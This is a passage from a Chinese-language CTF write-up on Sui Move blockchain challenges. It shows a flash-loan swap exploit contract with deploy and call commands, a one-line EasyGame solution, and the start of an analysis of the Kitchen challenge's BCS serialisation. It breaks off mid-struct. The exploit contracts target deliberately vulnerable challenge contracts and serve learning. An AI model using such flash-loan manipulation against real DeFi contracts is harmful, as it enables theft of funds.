+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> coin_b_swap <span style="color:#f92672">=</span> vault::swap_a_to_b<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(bank,my_coin_a,ctx);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 10A个换成B
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        assert!(coin::value(<span style="color:#f92672">&amp;</span>coin_b_swap) <span style="color:#f92672">==</span> <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">12</span>);  <span style="color:#75715e">// 换出来的B的数量是否等于100
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        transfer::public_transfer(coin_b_swap,tx_context::sender(ctx));
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 将100个B传递到我们的地址上
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        vault::repay_flash<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(bank,coin_a_1,coin_b_1,receipt_1);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 还债90个A
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> (coin_a_2,coin_b_2,receipt_2) <span style="color:#f92672">=</span> vault::flash<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(bank,<span style="color:#ae81ff">110</span>,<span style="color:#66d9ef">false</span>,ctx);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 再借110个A
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        assert!(coin::value(<span style="color:#f92672">&amp;</span>coin_a_2) <span style="color:#f92672">==</span> <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">11</span>);    <span style="color:#75715e">// 第二次借出来A的数量是否等于110
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        vault::get_flag<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(bank,ctx);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 拿flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        vault::repay_flash<span style="color:#f92672">&lt;</span>A,B<span style="color:#f92672">&gt;</span>(bank,coin_a_2,coin_b_2,receipt_2);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 还钱110A
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="部署攻击合约">部署攻击合约<a hidden class="anchor" aria-hidden="true" href="#部署攻击合约">#</a></h4>
+<p>这部分也该提一下，网上的资料基本都是英文的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#首先创建一个新的包</span>
+</span></span><span style="display:flex;"><span>sui move new zoiltin_solve_swap
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#文件结构如下：</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#zoiltin_solve_swap/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#|                /sources/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#|                |        exp.move</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#|                /Move.toml</span>
+</span></span></code></pre></div><p>Move.toml内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span>[<span style="color:#a6e22e">package</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">name</span> = <span style="color:#e6db74">&#34;zoiltin_solve_swap&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">version</span> = <span style="color:#e6db74">&#34;0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">dependencies</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sui</span> = { <span style="color:#a6e22e">git</span> = <span style="color:#e6db74">&#34;https://github.com/MystenLabs/sui.git&#34;</span>, <span style="color:#a6e22e">subdir</span> = <span style="color:#e6db74">&#34;crates/sui-framework/packages/sui-framework&#34;</span>, <span style="color:#a6e22e">rev</span> = <span style="color:#e6db74">&#34;framework/testnet&#34;</span> }
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sui = { local =  &#34;/opt/sui/crates/sui-framework/packages/sui-framework&#34; }</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">swap</span> = { <span style="color:#a6e22e">local</span> = <span style="color:#e6db74">&#34;../swap&#34;</span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">addresses</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">zoiltin_solve_swap</span> = <span style="color:#e6db74">&#34;0x0&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">swap</span> = <span style="color:#e6db74">&#34;package_id&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sui</span> = <span style="color:#e6db74">&#34;0x2&#34;</span>
+</span></span></code></pre></div><p>addresses里面：0x0代表此包尚未发布，意思就是这次要发布的包。如果已经发布了就像题目中的swap包就写这个包的package_id以及在published-at里写上package_id</p>
+<p>dependencies放源代码路径。</p>
+<p>swap源码里的Move.toml文件也要改：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span>[<span style="color:#a6e22e">package</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">name</span> = <span style="color:#e6db74">&#34;swap&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">version</span> = <span style="color:#e6db74">&#34;0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">published-at</span> = <span style="color:#e6db74">&#34;package_id&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">dependencies</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sui</span> = { <span style="color:#a6e22e">git</span> = <span style="color:#e6db74">&#34;https://github.com/MystenLabs/sui.git&#34;</span>, <span style="color:#a6e22e">subdir</span> = <span style="color:#e6db74">&#34;crates/sui-framework/packages/sui-framework&#34;</span>, <span style="color:#a6e22e">rev</span> = <span style="color:#e6db74">&#34;framework/testnet&#34;</span> }
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sui = { local =  &#34;/opt/sui/crates/sui-framework/packages/sui-framework&#34; }</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">addresses</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">swap</span> = <span style="color:#e6db74">&#34;package_id&#34;</span>
+</span></span></code></pre></div><p>在攻击合约目录下执行以下代码来发布包</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sui client publish --with-unpublished-dependencies --skip-dependency-verification --gas-budget <span style="color:#ae81ff">1000000000</span>
+</span></span></code></pre></div><p>可以查看CTFA和CTFB两个泛型的地址。
+CTFA和CTFB为题目定义的两种币，&ndash;type-args要传入CTFA和CTFB作为泛型。</p>
+<p>先调用vault里的initiate函数来初始化A,B个10个币。</p>
+<p>然后调用攻击合约中的exp函数.<code>sui client call --package &lt;攻击合约的package_id&gt; --module exp --function exp --type-args &lt;&lt;CTFA的详细地址&gt;,&lt;CTFB的详细地址&gt;&gt; --args &lt;那两个参数&gt; --gas-budget 10000000</code></p>
+<h3 id="easygame">EasyGame<a hidden class="anchor" aria-hidden="true" href="#easygame">#</a></h3>
+<p>源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>    public fun submit_solution(user_input: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u64</span><span style="color:#f92672">&gt;</span>,rc: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Challenge,ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext ){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> sender <span style="color:#f92672">=</span> sui::tx_context::sender(ctx);
+</span></span><span style="display:flex;"><span>       
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> houses <span style="color:#f92672">=</span> rc.initial_part;
+</span></span><span style="display:flex;"><span>        vector::append(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> houses, user_input);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> amount_robbed <span style="color:#f92672">=</span> rob(<span style="color:#f92672">&amp;</span>houses);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> result <span style="color:#f92672">=</span> amount_robbed <span style="color:#f92672">==</span> rc.target_amount;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>  (result) {
+</span></span><span style="display:flex;"><span>            event::emit(Flag { user: <span style="color:#a6e22e">sender</span>, flag: <span style="color:#a6e22e">true</span> });
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    public fun rob(houses: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u64</span><span style="color:#f92672">&gt;</span>):<span style="color:#66d9ef">u64</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> n <span style="color:#f92672">=</span> vector::length(houses);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> v <span style="color:#f92672">=</span> vector::empty<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u64</span><span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> v, <span style="color:#f92672">*</span>vector::borrow(houses, <span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (n<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> v, math::max(<span style="color:#f92672">*</span>vector::borrow(houses, <span style="color:#ae81ff">0</span>), <span style="color:#f92672">*</span>vector::borrow(houses, <span style="color:#ae81ff">1</span>)));
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (i <span style="color:#f92672">&lt;</span> n) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> dp_i_1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>v, i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> dp_i_2_plus_house <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>v, i <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>vector::borrow(houses, i);
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> v, math::max(dp_i_1, dp_i_2_plus_house));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        ;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>v, n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>house初始值为[1,2,4,5,1,3,6,7]，需要我们在house后追加一些数据是rob函数返回22。   <br>
+rob函数是用动态规划计算在不抢劫相邻房屋的情况下如何利益最大，发现添加一个数字9就可以。</p>
+<h4 id="攻击合约-1">攻击合约<a hidden class="anchor" aria-hidden="true" href="#攻击合约-1">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>module zoiltin_solve_easy_game::exp{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> std::vector;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::tx_context::TxContext;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> easygame::easy_game::{Self,Challenge};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public entry fun exp(rc: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Challenge,ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> payload <span style="color:#f92672">=</span> vector::empty<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u64</span><span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> payload,<span style="color:#ae81ff">9</span>);
+</span></span><span style="display:flex;"><span>        easy_game::submit_solution(payload,rc,ctx);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="kitchen">Kitchen<a hidden class="anchor" aria-hidden="true" href="#kitchen">#</a></h3>
+<blockquote>
+<p>sorce: 200</p>
+</blockquote>
+<p>题目关键源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>    public fun cook(olive_oils: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Olive_oil<span style="color:#f92672">&gt;</span>, yeast: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Yeast<span style="color:#f92672">&gt;</span>, flour: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Flour<span style="color:#f92672">&gt;</span>, salt: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Salt<span style="color:#f92672">&gt;</span>, status: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Status) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l1 <span style="color:#f92672">=</span> vector::length<span style="color:#f92672">&lt;</span>Olive_oil<span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span>olive_oils);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l2 <span style="color:#f92672">=</span> vector::length<span style="color:#f92672">&lt;</span>Yeast<span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span>yeast);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l3 <span style="color:#f92672">=</span> vector::length<span style="color:#f92672">&lt;</span>Flour<span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span>flour);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l4 <span style="color:#f92672">=</span> vector::length<span style="color:#f92672">&lt;</span>Salt<span style="color:#f92672">&gt;</span>(<span style="color:#f92672">&amp;</span>salt);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook1 <span style="color:#f92672">=</span> Cook {source : <span style="color:#a6e22e">vector</span>::empty<span style="color:#f92672">&lt;</span>Olive_oil<span style="color:#f92672">&gt;</span>()};
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook2 <span style="color:#f92672">=</span> Cook {source : <span style="color:#a6e22e">vector</span>::empty<span style="color:#f92672">&lt;</span>Yeast<span style="color:#f92672">&gt;</span>()};
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook3 <span style="color:#f92672">=</span> Cook {source : <span style="color:#a6e22e">vector</span>::empty<span style="color:#f92672">&lt;</span>Flour<span style="color:#f92672">&gt;</span>()};
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook4 <span style="color:#f92672">=</span> Cook {source : <span style="color:#a6e22e">vector</span>::empty<span style="color:#f92672">&lt;</span>Salt<span style="color:#f92672">&gt;</span>()};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l1) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook1.source, <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>olive_oils, i));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l2) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook2.source, <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>yeast, i));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l3) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook3.source, <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>flour, i));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l4) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook4.source, <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>salt, i));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> p <span style="color:#f92672">=</span> Pizza {
+</span></span><span style="display:flex;"><span>            olive_oils: <span style="color:#a6e22e">cook1</span>,
+</span></span><span style="display:flex;"><span>            yeast: <span style="color:#a6e22e">cook2</span>,
+</span></span><span style="display:flex;"><span>            flour: <span style="color:#a6e22e">cook3</span>,
+</span></span><span style="display:flex;"><span>            salt: <span style="color:#a6e22e">cook4</span>,
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        assert!( bcs::to_bytes(<span style="color:#f92672">&amp;</span>p) <span style="color:#f92672">==</span> x<span style="color:#e6db74">&#34;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1&#34;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        status.status1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun recook (out: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>, status: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> Status) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> p <span style="color:#f92672">=</span> Pizza {
+</span></span><span style="display:flex;"><span>            olive_oils: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Olive_oil<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>                source: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Olive_oil<span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                    get_Olive_oil(<span style="color:#ae81ff">0xb9d9</span>),
+</span></span><span style="display:flex;"><span>                    get_Olive_oil(<span style="color:#ae81ff">0xeb54</span>),
+</span></span><span style="display:flex;"><span>                    get_Olive_oil(<span style="color:#ae81ff">0x9268</span>),
+</span></span><span style="display:flex;"><span>                    get_Olive_oil(<span style="color:#ae81ff">0xc5f7</span>),
+</span></span><span style="display:flex;"><span>                    get_Olive_oil(<span style="color:#ae81ff">0xa1ec</span>),
+</span></span><span style="display:flex;"><span>                    get_Olive_oil(<span style="color:#ae81ff">0xd084</span>),
+</span></span><span style="display:flex;"><span>                ]
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            yeast: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Yeast<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>                source: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Yeast<span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                    get_Yeast(<span style="color:#ae81ff">0xbd00</span>),
+</span></span><span style="display:flex;"><span>                    get_Yeast(<span style="color:#ae81ff">0xfc81</span>),
+</span></span><span style="display:flex;"><span>                    get_Yeast(<span style="color:#ae81ff">0x999d</span>),
+</span></span><span style="display:flex;"><span>                    get_Yeast(<span style="color:#ae81ff">0xb77e</span>),
+</span></span><span style="display:flex;"><span>                ]
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            flour: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Flour<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>                source: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Flour<span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                    get_Flour(<span style="color:#ae81ff">0xdcc7</span>),
+</span></span><span style="display:flex;"><span>                    get_Flour(<span style="color:#ae81ff">0xcc7a</span>),
+</span></span><span style="display:flex;"><span>                    get_Flour(<span style="color:#ae81ff">0x8f19</span>),
+</span></span><span style="display:flex;"><span>                    get_Flour(<span style="color:#ae81ff">0x96b1</span>),
+</span></span><span style="display:flex;"><span>                    get_Flour(<span style="color:#ae81ff">0x8a6d</span>),
+</span></span><span style="display:flex;"><span>                ]
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            salt: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Salt<span style="color:#f92672">&gt;</span> {
+</span></span><span style="display:flex;"><span>                source: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>Salt<span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                    get_Salt(<span style="color:#ae81ff">0x8b01</span>),
+</span></span><span style="display:flex;"><span>                    get_Salt(<span style="color:#ae81ff">0xf1c5</span>),
+</span></span><span style="display:flex;"><span>                    get_Salt(<span style="color:#ae81ff">0xc6ec</span>),
+</span></span><span style="display:flex;"><span>                ]
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        assert!( bcs::to_bytes(<span style="color:#f92672">&amp;</span>p) <span style="color:#f92672">==</span> out, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        status.status2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>需要让这两个函数返回true。涉及到序列化。</p>
+<h4 id="先看cook函数">先看cook函数<a hidden class="anchor" aria-hidden="true" href="#先看cook函数">#</a></h4>
+<p>cook函数要我们传入一个配方对象，然后比较序列化后是否与<code>x&quot;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1&quot;</code>相等。</p>
+<blockquote>
+<p>Binary Canonical Serialization, BCS, 是在 Diem 区块链项目中开发出来的序列化格式，现在也被广泛应用于大部分基于 Move 的区块链，比如Sui, Starcoin, Aptos, 0L. 除了在 Move VM 虚拟机中使用，BCS也被用在交易 transaction 和事件 event 编码中，比如在签署交易之前做序列化处理，解析事件数据。
+相关资料：https://intro-zh.sui-book.com/advanced-topics/BCS_encoding/lessons/BCS_%E7%BC%96%E7%A0%81.html</p>
+</blockquote>
+<p>查阅资料得知：</p>
+<ul>
+<li>
+<p>BCS是一种数据序列化格式，其生成的输出字节不包含任何类型信息。因此，接收编码字节的一方需要知道如何反序列化数据</p>
+</li>
+<li>
+<p>BCS 中没有数据类型，当然也没有结构体 structs; struct 只是定义了内部字段 fields 被序列化的顺序</p>
+</li>
+</ul>
+<p>感觉这个c语言中的序列化比较相似，c语言中的将结构体从内存中写入二进制文件时就是直接原封不动把内存写入文件。而数据格式全靠程序员自定义。</p>
+<p>看下面这个例子便于理解：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Metadata</span> has drop, copy {
+</span></span><span style="display:flex;"><span>    name: <span style="color:#a6e22e">std</span>::ascii::String
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">BCSObject</span> has drop, copy {
+</span></span><span style="display:flex;"><span>    id: <span style="color:#a6e22e">ID</span>,
+</span></span><span style="display:flex;"><span>    owner: <span style="color:#a6e22e">address</span>,
+</span></span><span style="display:flex;"><span>    meta: <span style="color:#a6e22e">Metadata</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> (id, owner, meta) <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    bcs::peel_address(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> bcs), bcs::peel_address(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> bcs), bcs::peel_vec_u8(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> bcs)
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>反序列化meta时使用的格式是<code>vector&lt;u8&gt;</code>（8位整数数组，就是std::ascii::String的格式），也就是说序列化时直接忽略了Metadata结构体，直接把对象从内存中转储成字节。</p>
+<p>然后再看题目中的结构，以Olive_oil为例，其他四种食材都一样：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Olive_oil</span> has copy, drop, store {amount: <span style="color:#66d9ef">u16</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Pizza</span> has copy, drop, store {
+</span></span><span style="display:flex;"><span>    olive_oils: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Olive_oil<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>    yeast: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Yeast<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>    flour: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Flour<span style="color:#f92672">&gt;</span>,
